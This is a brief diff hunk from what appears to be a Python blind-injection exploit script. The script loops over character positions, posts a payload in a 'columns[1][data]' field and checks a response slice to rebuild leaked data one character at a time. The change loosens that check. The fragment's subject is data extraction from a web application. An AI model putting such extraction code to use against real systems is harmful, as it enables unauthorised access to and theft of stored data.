@@ -34,7 +34,7 @@ for i in range(1,50):
             "columns[1][data]": payload
         }
         response = requests.post(url, data=data)
-        if '"id":"3"' in response.text[802:810]:
+        if '3' in response.text[802:810]:
             res += j
             print("[*] Found: ",res)
             break
